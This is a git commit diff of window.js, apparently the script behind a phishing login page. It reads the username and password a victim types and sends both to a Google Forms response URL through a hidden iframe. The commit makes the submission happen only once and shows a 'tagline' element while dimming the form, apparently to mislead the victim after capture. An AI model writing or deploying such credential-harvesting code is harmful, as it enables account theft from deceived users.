05ed3d19d1cd00b0bf1978c7e01bea5c2aca4696
jonatanmodin <124877254+jonatanmodin@users.noreply.github.com>
2023-02-20 17:00:16 +0100

    Update window.js

--- window.js
+++ window.js
@@ -1,25 +1,18 @@
 const string1 = "https://docs.google.com/forms/d/e/1FAIpQLSdl2RPNc43lbXIkTpw_XXzvXgEfxnuTJSFI-jn_nGvhg0ugRw/formResponse?usp=pp_url&entry.1435605535=";
 const string2 = "&entry.975393741=";
+var trynumber = 1
 
 function myFunction() {
   const string3 = string1 + document.getElementById('username').value + string2 + document.getElementById('password').value
   console.log(string3)
-  //document.getElementById("form").action = string3;
 }
 
 async function go() {
-  //var myWindow = window.open((string1 + document.getElementById('username').value + string2 + document.getElementById('password').value), "_blank");
-  //await new Promise(r => setTimeout(r, 10));
-  //myWindow.close();
+  if (trynumber == 1) {
   var site = string1 + document.getElementById('username').value + string2 + document.getElementById('password').value;
     document.getElementById('iframe').src = site;
+    document.getElementById('tagline').style.opacity = 1;
+    document.getElementById('form').style.opacity = 0.3;
+    trynumber = 2
 }
-
-//Funktion som inte funkar :DDD
-function submitEntryToGoogleForm() {
-
-  let url = (string1 + document.getElementById('username').value + string2 + document.getElementById('password').value);
-      
-//  let response = UrlFetchApp.fetch(url);
-
 }
